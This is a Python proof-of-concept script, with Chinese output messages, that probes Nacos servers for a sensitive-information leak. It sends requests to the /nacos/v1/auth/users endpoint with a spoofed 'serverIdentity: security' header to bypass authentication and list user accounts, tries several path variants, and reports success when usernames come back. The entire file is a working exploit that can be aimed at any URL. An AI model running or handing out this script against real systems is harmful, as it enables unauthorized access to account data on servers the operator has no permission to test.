'''
Function:
    nacos 敏感信息泄露
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/nacos/v1/auth/users/?pageNo=1&pageSize=9".format(scheme, netloc)
        self.headers["serverIdentity"] = "security"
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if result.status_code == 200 and "\"username\":\"" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            elif result.status_code == 500 and "Parameter conditions" in result.text:
                url = "{}://{}/nacos/v1/auth/users/?pageNo=1&pageSize=9&search=accurate".format(scheme, netloc)
                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if result.status_code == 200 and "\"username\":\"" in result.text:
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    return True
                else:
                    return False
            elif result.status_code == 404:
                url1 = "{}://{}/v1/auth/users/?pageNo=1&pageSize=9".format(scheme, netloc)
                result = requests.get(url=url1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if result.status_code == 200 and "\"username\":\"" in result.text:
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    return True
                elif result.status_code == 500 and "Parameter conditions" in result.text:
                    url = "{}://{}/v1/auth/users/?pageNo=1&pageSize=9&search=accurate".format(scheme, netloc)
                    result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                    if result.status_code == 200 and "\"username\":\"" in result.text:
                        target = urlparse(url)
                        self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                        for request_type, request_text in dict(result.request.headers).items():
                            self.result_text += "\n                 {}: {}".format(request_type, request_text)
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

